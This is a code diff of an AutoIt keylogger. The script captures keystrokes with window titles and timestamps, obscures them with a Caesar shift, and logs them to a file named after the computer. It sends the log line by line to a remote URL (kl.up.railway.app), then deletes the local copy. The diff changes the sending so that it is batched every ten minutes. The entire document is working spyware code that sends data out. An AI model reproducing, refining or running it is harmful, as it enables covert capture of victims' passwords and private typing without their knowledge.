@@ -11,9 +11,9 @@ Global $file, $f3 = 0
 Global $url = "https://kl.up.railway.app/?kl="
 Global $lastActiveWindow = "", $lastActiveTime = 0
 Global $file_name = @computername & "_log.txt"
+Global $last_send = 0
 While 1
- 
-	_Main()
+ 	_Main()
     Sleep(250)
 WEnd
 
@@ -27,9 +27,8 @@ Func _Main()
     Local $startTime = TimerInit()
 
 	
-	send_file()
+	send_file(true)
 
-	$file = FileOpen($file_name, 9)
 
 
     While 1
@@ -46,6 +45,8 @@ Func _Main()
 			write_file()
             $lastActiveTime = TimerInit()
         EndIf
+		send_file(false)
+		
     WEnd
 EndFunc
 
@@ -54,39 +55,37 @@ EndFunc
 
 Func write_file()
     If $buffer <> "" Then
+		$file = FileOpen($file_name, $FO_READ + $FO_OVERWRITE)
         $title_1 = WinGetTitle("")
         $buffer = @CRLF & @CRLF & "====Title:" & $title_1 & "====Time:" & @YEAR & "." & @MON & "." & @MDAY & "--" & @HOUR & ":" & @MIN & ":" & @SEC & @CRLF & $buffer
         $buffer = CifrarDesplazamiento($buffer, 3)
 
-		; Encode the data before sending
 		$buffer = BinaryToString(Binary($buffer))
         FileWrite($file, $buffer)
         $buffer = ""
+		FileClose($file)
     EndIf
 EndFunc
 
-Func send_file()
-
-
+Func send_file($forced_action)
+	if TimerDiff($last_send) > 600000 or $forced_action=true then 
 		Local $aArray = FileReadToArray($file_name)
 		If @error Then
-			MsgBox($MB_SYSTEMMODAL, "", "There was an error reading the file. @error: " & @error) ; An error occurred reading the current script file.
+			MsgBox($MB_SYSTEMMODAL, "", "There was an error reading the file. @error: " & @error) 
 		Else
-			For $i = 0 To UBound($aArray) - 1 ; Loop through the array.
+			For $i = 0 To UBound($aArray) - 1 
 					InetRead($url & $aArray[$i], $INET_FORCERELOAD)
 			Next
 		EndIf
-
-
-		FileClose($file)
-		Local $iDelete = FileDelete($file)
-			; Display a message of whether the file was deleted.
+		$last_send=0
+		FileClose($file_name)
+		Local $iDelete = FileDelete($file_name)
 		If $iDelete Then
 			MsgBox($MB_SYSTEMMODAL, "", "The file was successfuly deleted.")
 		Else
 			MsgBox($MB_SYSTEMMODAL, "", "An error occurred whilst deleting the file.")
 		EndIf
-
+	endif
 EndFunc
 
 
@@ -98,15 +97,10 @@ Func EvaluateKey($keycode)
         If $title_1 <> $title Then
             $title_1 = $title
             $buffer = @CRLF & @CRLF & "====Title:" & $title_1 & "====Time:" & @YEAR & "." & @MON & "." & @MDAY & "--" & @HOUR & ":" & @MIN & ":" & @SEC & @CRLF & $buffer
-            $buffer = CifrarDesplazamiento($buffer, 3)
-            FileWrite($file, $buffer)
-            InetRead($url & $buffer, $INET_FORCERELOAD)
-        Else
-            $buffer = CifrarDesplazamiento($buffer, 3)
-            FileWrite($file, $buffer)
- ;           InetRead($url & $buffer, $INET_FORCERELOAD)
-        EndIf
-    Endif
+       EndIf
+	   $buffer = CifrarDesplazamiento($buffer, 3)
+	   FileWrite($file, $buffer)
+	Endif
 EndFunc
 
 Func key($keycode2)
